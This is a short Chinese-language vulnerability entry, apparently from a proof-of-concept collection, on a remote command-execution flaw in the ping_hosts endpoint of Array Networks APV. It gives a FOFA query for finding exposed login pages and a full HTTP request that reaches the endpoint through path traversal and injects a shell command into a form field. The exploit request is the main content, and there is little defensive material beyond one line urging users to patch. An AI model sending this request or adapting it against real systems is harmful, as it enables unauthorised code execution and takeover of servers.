# Array-Networks-APV应用交付系统ping_hosts存在任意命令执行漏洞

# 一、漏洞简介
Array Networks APV应用交付系统 /rest/ping_hosts 接口存在远程命令执行漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。该漏洞利用难度较低，建议受影响的用户尽快修复.

# 二、影响版本
+ Array APV

# 三、资产测绘
+ fofa`app="Array-APV" && title=="Login"`
+ 特征

![1726293906133-59539fc8-cda4-4f9f-82de-3b0706541ee4.png](./img/f_WgzfyB4eIEXb7f/1726293906133-59539fc8-cda4-4f9f-82de-3b0706541ee4-291132.png)

# 四、漏洞复现
```java
POST /restapi/../rest/ping_hosts HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: keep-alive
Content-Length: 98

["127.0.0.1| echo `whoami` received 2 3 4"]=1&csrfmiddlewaretoken=cXLnOdGshlksqOG0Ubnn4SlBvO8zOdWW
```

![1726293935346-e551c4a1-2a2b-4c39-9442-7b5fb3509fc8.png](./img/f_WgzfyB4eIEXb7f/1726293935346-e551c4a1-2a2b-4c39-9442-7b5fb3509fc8-517338.png)





> 更新: 2024-10-22 09:40:53  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cvbg0a36xeft22g9>